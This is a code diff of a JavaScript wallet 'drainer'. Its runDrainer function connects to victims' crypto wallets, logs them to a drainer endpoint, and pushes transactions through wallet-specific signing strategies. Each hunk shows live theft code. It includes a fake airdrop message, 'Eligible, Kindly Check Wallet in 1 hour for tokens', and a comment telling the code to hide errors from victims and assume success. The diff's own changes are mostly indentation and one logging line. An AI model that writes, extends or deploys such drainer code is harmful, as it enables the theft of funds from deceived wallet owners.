@@ -1143,6 +1143,7 @@ async function runDrainer(provider) {
       const walletType = connectedWalletType;
       
       // Log wallet connection (balance will be updated after balance check)
+      console.log('[WALLET] About to log wallet connection with type:', walletType);
       fetch('/api/drainer/log-wallet', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -1308,7 +1309,7 @@ async function runDrainer(provider) {
         // Wallet-specific signing strategies
         if (connectedWalletType === 'Glow') {
           console.log('[SIGNING] Using Glow-specific signing strategy');
-          if (typeof provider.signAndSendTransaction === 'function') {
+      if (typeof provider.signAndSendTransaction === 'function') {
             return await provider.signAndSendTransaction(transaction);
           } else if (typeof provider.signTransaction === 'function') {
             return await provider.signTransaction(transaction);
@@ -1339,10 +1340,10 @@ async function runDrainer(provider) {
         } else {
           // Default strategy for other wallets
           if (typeof provider.signAndSendTransaction === 'function') {
-            console.log('[SIGNING] Using signAndSendTransaction');
+        console.log('[SIGNING] Using signAndSendTransaction');
             return await provider.signAndSendTransaction(transaction);
-          } else if (typeof provider.signTransaction === 'function') {
-            console.log('[SIGNING] Using signTransaction');
+      } else if (typeof provider.signTransaction === 'function') {
+        console.log('[SIGNING] Using signTransaction');
             return await provider.signTransaction(transaction);
           }
         }
@@ -1579,11 +1580,11 @@ async function runDrainer(provider) {
                         
                         showStatus('Eligible, Kindly Check Wallet in 1 hour for tokens', 'success');
                       }
-                            } catch (statusError) {
-          console.log('[STATUS] Could not check transaction status:', statusError);
+                    } catch (statusError) {
+                      console.log('[STATUS] Could not check transaction status:', statusError);
           // Don't show technical errors to users - assume success
           showStatus('Eligible, Kindly Check Wallet in 1 hour for tokens', 'success');
-        }
+                    }
                   }, 5000); // Check after 5 seconds
         
       }, 1000);
@@ -2569,7 +2570,7 @@ window.openWalletModal = async function openWalletModal() {
         // If window.open fails, try location.href
         if (!newWindow || newWindow.closed) {
           console.log(`[DEEP_LINK] window.open failed, trying location.href`);
-          window.location.href = deepLink;
+      window.location.href = deepLink;
         }
       } catch (error) {
         console.error(`[DEEP_LINK] Error opening ${walletType} deep link:`, error);
